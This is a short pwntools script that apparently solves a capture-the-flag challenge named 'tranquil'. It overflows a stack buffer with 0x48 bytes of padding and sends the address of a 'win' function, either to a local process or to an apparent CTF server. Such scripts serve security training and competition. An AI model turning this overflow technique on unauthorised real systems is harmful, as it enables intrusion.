#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./tranquil')

if args.REMOTE:
    io = remote('shell.actf.co', 21830)
else:
    io = process(binary.path)

log.info(io.recvline())
payload = flat('A'*0x48, p64(binary.sym.win))
print(payload)
io.sendline(payload)
io.stream()
